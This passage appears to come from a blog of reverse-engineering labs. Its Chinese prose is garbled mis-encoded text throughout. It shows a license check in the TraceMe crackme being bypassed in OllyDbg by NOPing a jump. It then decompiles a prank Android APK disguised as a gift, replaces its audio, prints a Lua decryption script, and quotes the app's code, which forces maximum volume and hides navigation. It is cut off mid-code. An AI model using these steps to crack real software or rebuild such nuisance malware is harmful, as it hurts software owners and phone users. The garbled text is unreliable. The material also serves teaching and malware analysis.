·çš„æ–¹æ³•ä¿®æ”¹å¦ä¸€å¤„ jnz</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114150700806.png" alt="image-20241114150700806"></p><p>ä¿®æ”¹å®Œæ¯•ï¼Œå³é”®â€”â€”å¤åˆ¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶â€”â€”æ‰€æœ‰ä¿®æ”¹</p><p>æ¥ä¸‹æ¥ f9 å†æ¬¡æ‰§è¡Œï¼Œéšä¾¿è¾“å…¥è´¦å·å’Œè®¸å¯å³å¯è¿”å›æ³¨å†ŒæˆåŠŸ</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114151118981.png" alt="image-20241114151118981"></p><hr><h1 id="2ï¼šOllyDbgå®ç°TraceMeè½¯ä»¶é€†å‘"><a href="#2ï¼šOllyDbgå®ç°TraceMeè½¯ä»¶é€†å‘" class="headerlink" title="2ï¼šOllyDbgå®ç°TraceMeè½¯ä»¶é€†å‘"></a>2ï¼šOllyDbgå®ç°TraceMeè½¯ä»¶é€†å‘</h1><h2 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æœ¬å®éªŒé‡‡ç”¨è½¯ä»¶ OllyDbg å¯¹è½¯ä»¶è¿›è¡Œçˆ†ç ´ï¼ŒTraceMe æ˜¯ä¸€ä¸ªç”¨äºé€†å‘å·¥ç¨‹ç ”ç©¶çš„ exe å¯æ‰§è¡Œæ–‡ä»¶ï¼ŒåŒå‡»æ‰“å¼€å®ƒä¼šå‡ºç°ä¸€ä¸ªéœ€è¦è¾“å…¥ç”¨æˆ·åä¸å¯†ç çš„ç•Œé¢ï¼Œæ­£ç¡®çš„ç”¨æˆ·åä¸å¯†ç åªæœ‰ä¸€ä¸ªï¼Œåªæœ‰å½“è¾“å…¥çš„ç”¨æˆ·åä¸å¯†ç æ­£ç¡®æ—¶æ‰ä¼šæ˜¾ç¤ºæˆåŠŸï¼Œæœ¬å®éªŒä½¿ç”¨ OllyDbg åˆ†æå…¶æºç ï¼Œæ‰¾åˆ°å…³é”®è·³è½¬çš„ä»£ç ï¼Œå¹¶è¿›è¡Œçˆ†ç ´ï¼Œè¾¾åˆ°è¾“å…¥ä»€ä¹ˆç”¨æˆ·åä¸å¯†ç éƒ½ä¼šæ˜¾ç¤ºæˆåŠŸçš„ç›®çš„ï¼Œå¹¶ä¸”å¯¼å‡ºä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><h2 id="æ­¥éª¤-2"><a href="#æ­¥éª¤-2" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li><p>è¿è¡ŒTraceMe</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114171522596.png" alt="image-20241114171522596"></p></li><li><p>æŸ¥å£³</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114172154997.png" alt="image-20241114172154997"></p><p>æ— å£³ï¼Œæ˜¯ c++ å†™çš„</p></li><li><p>Ollydbgæ‰“å¼€ TraceMe è¿›è¡Œè°ƒè¯•</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114172010551.png" alt="image-20241114172010551"></p><p>åˆšæ‰“å¼€æ—¶å‘ç°å…‰æ ‡åœåœ¨004013A0å¤„ï¼Œæ­¤å¤„ä¸ºç¨‹åºçš„å…¥å£ç‚¹ï¼ˆEntryPointï¼‰</p></li><li><p>å‰é¢è§‚å¯Ÿåˆ°è¿™ä¸ªç¨‹åºæœ‰ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œæœ‰è¾“å…¥çš„è¯ç¨‹åºå¿…ç„¶è¦ä»è¾“å…¥æ¡†ä¸­è¯»å–å­—ç¬¦ï¼Œè€Œè¯»å–å­—ç¬¦é€šå¸¸ä½¿ç”¨ä½¿ç”¨çš„ API æ˜¯ GetDlgItemText æˆ–è€… GetWindowText å‡½æ•°ï¼Œä¹Ÿå¯ä»¥å‘é€æ¶ˆæ¯ç›´æ¥è·å–æ–‡æœ¬æ¡†ä¸­çš„æ–‡æœ¬</p><p>ä¸è¿‡ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥çŸ¥é“ç¨‹åºç”¨äº†ä»€ä¹ˆå‡½æ•°æ¥å¤„ç†å­—ç¬¦ï¼Œå¤šå¤šå°è¯•</p><p>å¿«æ·é”® Ctrl+Gï¼Œå¯ä»¥æ‰“å¼€ä¸€ä¸ªè·Ÿéšè¡¨è¾¾å¼çª—å£ï¼Œå¦‚å›¾ï¼Œè¾“å…¥ GetDlgItemTextA ï¼Œå›è½¦è·³è½¬ï¼ˆPSï¼šODå¯¹å¤§å°å†™æ•æ„Ÿï¼‰</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114172622969.png" alt="image-20241114172622969"></p><p>è·³è½¬è‡³ 75207A60ï¼ŒGetDlgItemTextA å‡½æ•°çš„å…¥å£ç‚¹ï¼Œf2ä¸‹æ–­ç‚¹</p></li><li><p>f9è¿è¡Œç¨‹åºï¼Œè¾“å…¥æ•°æ®check</p><p>å®ƒä¼šæ–­åœ¨æˆ‘ä»¬åˆšæ‰ä¸‹æ–­ç‚¹çš„åœ°æ–¹ï¼Œä¹‹åf8å•æ­¥æ‰§è¡Œï¼Œåˆšæ‰ä¸‹æ–­ç‚¹çš„åœ°æ–¹è¦æ‰§è¡Œç»è¿‡ä¸¤æ¬¡ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¨‹åºæœ‰ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œå¯ä»¥ç›´æ¥ctrl+f9 è¿è¡Œåˆ°å‡½æ•°å†…çš„ return</p><p>ä¸€èˆ¬APIå‡½æ•°éƒ½æœä» __stdcall è°ƒç”¨çº¦å®šï¼Œå³å‡½æ•°å…¥å£å‚æ•°æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºå…¥æ ˆï¼Œç”±è¢«è°ƒç”¨è€…æ¸…ç†æ ˆä¸­çš„å‚æ•°ï¼Œè¿”å›å€¼æ”¾åœ¨ eax å¯„å­˜å™¨ä¸­</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114173311060.png" alt="image-20241114173311060"></p><p>æ­¤æ—¶æˆ‘ä»¬çš„ç”¨æˆ·åå’Œåºåˆ—å·åˆ†åˆ«åœ¨ edx å’Œ eax å¯„å­˜å™¨ä¸­</p><p>ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªåˆ¤æ–­<code>test eax,eax</code>ï¼Œåˆ¤æ–­ eax æ˜¯å¦ &#x3D; 0</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114174622928.png" alt="image-20241114174622928"></p><p>eax&#x3D;0è¡¨ç¤ºæ³¨å†Œå¤±è´¥ï¼Œeax&#x3D;1è¡¨ç¤ºæ³¨å†ŒæˆåŠŸï¼Œä¸‹é¢çš„è·³è½¬è¯­å¥ï¼Œè‹¥ä¸è·³è½¬è¡¨ç¤ºæˆåŠŸ</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114174719894.png" alt="image-20241114174719894"></p></li><li><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è®©å…¶è·³è½¬å¤±æ•ˆï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯å°†æ ‡å¿—å¯„å­˜å™¨ zf æ ‡å¿—ä½ç”±1å˜ä¸º0å°±å¯ä»¥äº†ï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•æœ‰ä¸ªé—®é¢˜å°±æ˜¯æ²¡æœ‰åŠæ³•ä¿å­˜ï¼Œä¸‹æ¬¡è¿è¡Œå°±ä¼šå¤±æ•ˆï¼Œç¬¬äºŒç§æ–¹æ³•æ˜¯å°†è·³è½¬è¯­å¥ç”¨ nop æŒ‡ä»¤å¡«å……ï¼Œç„¶åä¿å­˜</p><p>è¿™é‡Œé‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼Œå³é”®å°†<code>je short TraceMe.0040122E</code> nopæ‰</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175205537.png" alt="image-20241114175205537"></p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175242047.png" alt="image-20241114175242047"></p><p>å³é”®é€‰æ‹©å¤åˆ¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶&#x3D;&#x3D;&gt;æ‰€æœ‰ä¿®æ”¹</p><p>åœ¨å¼¹å‡ºçš„çª—å£ä¸­é¼ æ ‡å³é”®åé€‰æ‹©ä¿å­˜æ–‡ä»¶</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175344126.png" alt="image-20241114175344126"></p><p>è¿™è¾¹è°ƒè¯•ç»§ç»­è¿è¡Œèƒ½è·å¾—æˆåŠŸçš„å›æ˜¾</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175458187.png" alt="image-20241114175458187"></p><p>åˆšæ‰ä¿å­˜çš„ç¨‹åºä¹Ÿèƒ½æ­£å¸¸è¿è¡Œå¹¶æˆåŠŸå›æ˜¾</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175546469.png" alt="image-20241114175546469"></p></li></ol><hr><h1 id="3ï¼šåŸºäºapktoolçš„ç—…æ¯’åˆ†æä¸åˆ¶ä½œ"><a href="#3ï¼šåŸºäºapktoolçš„ç—…æ¯’åˆ†æä¸åˆ¶ä½œ" class="headerlink" title="3ï¼šåŸºäºapktoolçš„ç—…æ¯’åˆ†æä¸åˆ¶ä½œ"></a>3ï¼šåŸºäºapktoolçš„ç—…æ¯’åˆ†æä¸åˆ¶ä½œ</h1><h2 id="æ¦‚è¿°-2"><a href="#æ¦‚è¿°-2" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>ç†Ÿæ‚‰å¯¹ç—…æ¯’çš„é€†å‘å·¥ç¨‹ï¼Œä¹Ÿç†Ÿæ‚‰é€†å‘å·¥ç¨‹ç›¸å…³å·¥å…·çš„ä½¿ç”¨ï¼Œæœ€åé€šè¿‡é€†å‘å·¥ç¨‹å®ç°å¯¹ç—…æ¯’çš„åˆ†æä»¥åŠé‡æ–°åˆ¶ä½œæ–°çš„ç—…æ¯’</p><h2 id="å·¥å…·-1"><a href="#å·¥å…·-1" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><ol><li>apktoolï¼šå¯ä»¥åç¼–è¯‘è½¯ä»¶çš„å¸ƒå±€æ–‡ä»¶ã€å›¾ç‰‡ç­‰èµ„æºã€‚</li><li>dex2jarï¼šå°†apkåç¼–è¯‘æˆjavaæºç ï¼ˆclasses.dex è½¬åŒ–æˆ jar æ–‡ä»¶ï¼‰</li><li>jd-guiï¼šæŸ¥çœ‹APKä¸­classes.dexè½¬åŒ–æˆå‡ºçš„jaræ–‡ä»¶ï¼Œå³æºç æ–‡ä»¶ã€‚</li></ol><h2 id="æ­¥éª¤-3"><a href="#æ­¥éª¤-3" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li><p>å°†åç¼€æ”¹ä¸º.zipæ–‡ä»¶å¹¶åšç®€å•åˆ†æï¼Œapk å’Œ jar åŒ…ä¸€æ ·ï¼Œéƒ½å¯ä»¥è¢«è§£å‹</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114191511160.png" alt="image-20241114191511160"></p><p>å¯ä»¥çœ‹åˆ° assets ä¸‹æœ‰ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶å’Œ2ä¸ª .lua æ–‡ä»¶</p></li><li><p>ä½¿ç”¨apktoolè¿›è¡Œåç¼–è¯‘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> apktool_2.10.0.jar  d ä¸€ä»½ç¤¼ç‰©.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114203203147.png" alt="image-20241114203203147"></p><p>æ–‡ä»¶ç»“æ„ï¼š</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114203858896.png" alt="image-20241114203858896"></p><ul><li><p>assetsï¼šå­˜æ”¾èµ„æºæ–‡ä»¶ï¼ŒåŒ…å«Luaè„šæœ¬luaå’ŒéŸ³é¢‘æ–‡ä»¶mp3</p></li><li><p>libï¼šæœ¬åœ°åº“ï¼ˆNative Libraryï¼‰æ–‡ä»¶å¤¹ï¼ŒåŒ…å«ç¼–è¯‘åçš„æœ¬åœ°ä»£ç ï¼ˆNative Codeï¼‰çš„soæ–‡ä»¶</p></li><li><p>smailï¼šå­˜æ”¾smailæ–‡ä»¶ï¼ŒåŒ…å«Dalvikå­—èŠ‚ç ï¼Œæ˜¯å¯¹Appçš„Javaä»£ç åå‘æˆä¸­ç«‹å­—èŠ‚ç çš„ç»“æœ</p></li><li><p>AndroidManifest.xmlï¼šåŒ…å«Appçš„ä¿¡æ¯ï¼ŒAppåä¸ºé€ç»™æœ€å¥½çš„TAï¼ŒåŒ…åä¸º com.sgzh.dt</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>configChanges</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keyboardHidden|orientation|screenSize<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>é€ç»™æœ€å¥½çš„TA<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.androlua.LuaActivity<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>theme</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@style/app_theme<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intent-filter</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.intent.action.VIEW<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>category</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.intent.category.DEFAULT<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>category</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.intent.category.BROWSABLE<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span> <span class="token attr-name"><span class="token namespace">android:</span>scheme</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>androlua<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span> <span class="token attr-name"><span class="token namespace">android:</span>host</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.sgzh.dt<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>å°†æ–‡ä»¶å¤¹é‡Œçš„éŸ³é¢‘æ–‡ä»¶æ›¿æ¢</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114201007640.png" alt="image-20241114201007640"></p></li><li><p>å°†å‰é¢è§£å‹å‡ºæ¥çš„ class.dex æ–‡ä»¶æ”¾å…¥ dex2jar å·¥å…·é‡Œè¿›è¡Œåç¼–è¯‘æˆ Java æºç </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">d2j-dex2jar.bat classes.dex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114203256661.png" alt="image-20241114203256661"></p></li><li><p>ä½¿ç”¨ jd-gui å¯¹Javaæºç è¿›è¡Œåˆ†æ</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114204253812.png" alt="image-20241114204253812"></p><p>å¤§éƒ¨åˆ†ä»£ç å‡æ¥è‡ªäºAndroLua_proï¼ŒAndroLua_pro æ˜¯ä¸€ä¸ªä½¿ç”¨ Lua ç¼–å†™ Android åº”ç”¨çš„é¡¹ç›®ï¼Œæ¢è€Œè¨€ä¹‹ï¼ŒJavaéƒ¨åˆ†ææœ‰å¯èƒ½å¹¶ä¸æ˜¯åº”ç”¨çš„ä¸»ä½“éƒ¨åˆ†ï¼Œé‡è¦æ“ä½œå¾ˆæœ‰å¯èƒ½ä¼šå†™åœ¨Lua</p><p>é™¤äº†AndroLua_proçš„ä»£ç å¤–ï¼Œæˆ‘ä»¬è¿˜å‘ç°äº†com.b.a.aã€com.b.a.b è¿™ä¸¤ä¸ªç»è¿‡æ··æ·†çš„åŒ…åï¼Œç»è¿‡æŸ¥è¯å¾—çŸ¥é‡Œé¢çš„ä»£ç æ¥æº TextWarrior</p></li><li><p>é‚£ä¹ˆè¿˜æ˜¯æŠŠé‡ç‚¹æ”¾åœ¨åˆ†æ Lua è„šæœ¬ï¼Œæ‰“å¼€ assets ä¸‹çš„ init.lua å’Œ main.lua å‘ç°å…¨æ˜¯ä¹±ç ä¹Ÿä¸æ˜¯å­—èŠ‚ç ï¼Œåº”è¯¥æ˜¯è¢«åŠ å¯†äº†</p><p>æ‰¾ä¸€ä¸‹åŠ è½½ lua è„šæœ¬çš„åœ°æ–¹</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114212350288.png" alt="image-20241114212350288"></p><p>è·Ÿè¸ªè¿™é‡Œçš„ luaState ç±»</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114212445087.png" alt="image-20241114212445087"></p><p>å¼•å…¥äº†ä¸€ä¸ª lib åº“ï¼Œå¯çŸ¥åŠ å¯†ä½¿ç”¨çš„æ˜¯ &#x2F;lib&#x2F;armeabli-v7a&#x2F;libluajava.so</p><p>ä½¿ç”¨ ida é€†å‘è¿™ä¸ª so æ–‡ä»¶ï¼Œæ‰¾ luaState ç±»é‡Œé¢çš„æ–¹æ³•å¯¹åº”çš„å‡½æ•°</p><p>åœ¨ luaL.loadbufferx å‡½æ•°ä¸­å‘ç°è§£å¯†çš„è¿‡ç¨‹</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114212817929.png" alt="image-20241114212817929"></p><p>ç”¨ pcat å¤§ä½¬çš„è§£å¯†è„šæœ¬ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf8 -*-</span>__author__<span class="token operator">=</span><span class="token string">'pcat@chamd5.org'</span>__blog__<span class="token operator">=</span><span class="token string">'http://pcat.cc'</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    outfile<span class="token operator">=</span><span class="token string">'init_out.lua'</span>    <span class="token keyword">if</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token punctuation">)</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x4c</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rst<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token punctuation">)</span>        size<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        v10<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>            v10<span class="token operator">+=</span>size            v<span class="token operator">=</span><span class="token punctuation">(</span>c_ulonglong<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2139062143</span><span class="token operator">*</span>v10<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span>v10            v1<span class="token operator">=</span>c_uint<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">7</span>            v2<span class="token operator">=</span>c_int<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">&lt;</span><span class="token number">0</span>            rst<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v10<span class="token operator">+</span>v1<span class="token operator">+</span>v2<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>outfile<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>rst<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        filename<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>            filename<span class="token operator">=</span><span class="token string">'init.lua'</span>    decrypt<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    foo<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§£å¯†åçš„ lua æ–‡ä»¶ï¼š</p><p>init.lua</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> L0_0appname <span class="token operator">=</span> <span class="token string">"\233\128\129\231\187\153\230\156\128\229\165\189\231\154\132TA"</span>appver <span class="token operator">=</span> <span class="token string">"1.0"</span>appcode <span class="token operator">=</span> <span class="token string">"10"</span>appsdk <span class="token operator">=</span> <span class="token string">"15"</span>path_pattern <span class="token operator">=</span> <span class="token string">""</span>packagename <span class="token operator">=</span> <span class="token string">"com.sgzh.dt"</span>theme <span class="token operator">=</span> <span class="token string">"Theme_DeviceDefault_Dialog_NoActionBar_MinWidth"</span>app_key <span class="token operator">=</span> <span class="token string">""</span>app_channel <span class="token operator">=</span> <span class="token string">""</span>developer <span class="token operator">=</span> <span class="token string">""</span>description <span class="token operator">=</span> <span class="token string">""</span>debugmode <span class="token operator">=</span> <span class="token keyword">false</span>L0_0 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"INTERNET"</span><span class="token punctuation">,</span>  <span class="token string">"WRITE_EXTERNAL_STORAGE"</span><span class="token punctuation">&#125;</span>user_permission <span class="token operator">=</span> L0_0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>main.lua</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"import"</span><span class="token punctuation">)</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.app.*"</span><span class="token punctuation">)</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.os.*"</span><span class="token punctuation">)</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.widget.*"</span><span class="token punctuation">)</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.view.*"</span><span class="token punctuation">)</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.view.View"</span><span class="token punctuation">)</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.content.Context"</span><span class="token punctuation">)</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.media.MediaPlayer"</span><span class="token punctuation">)</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.media.AudioManager"</span><span class="token punctuation">)</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"com.androlua.Ticker"</span><span class="token punctuation">)</span>activity<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>AUDIO_SERVICE<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setStreamVolume</span><span class="token punctuation">(</span>AudioManager<span class="token punctuation">.</span>STREAM_MUSIC<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> AudioManager<span class="token punctuation">.</span>FLAG_SHOW_UI<span class="token punctuation">)</span>activity<span class="token punctuation">.</span><span class="token function">getDecorView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSystemUiVisibility</span><span class="token punctuation">(</span>View<span class="token punctuation">.</span>SYSTEM_UI_FLAG_HIDE_NAVIGATION <span class="token operator">|</span> View<span class="token punctuation">.</span>SYSTEM_UI_FLAG_IMMERSIVE<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token function">MediaPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>m<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>m<span class="token punctuation">.</span><span class="token function">setDataSource</span><span class="token punctuation">(</span>activity<span class="token punctuation">.</span><span class="token function">getLuaDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">..</span> <span class="token string">"/0.mp3"</span><span class="token punctuation">)</span>m<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span>m<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>m<span class="token punctuation">.</span><span class="token function">setLooping</span><span class="token punctuation">(</span><span class="token keyword">true</span><span class="token punctuation">)</span>ti <span class="token operator">=</span> <span class="token function">Ticker</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ti<span class="token punctuation">.</span>Period <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">function</span> ti<span class="token punctuation">.</span><span class="token function">onTick</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  activity<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>AUDIO_SERVICE<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setStreamVolume</span><span class="token punctuation">(</span>AudioManager<span class="token 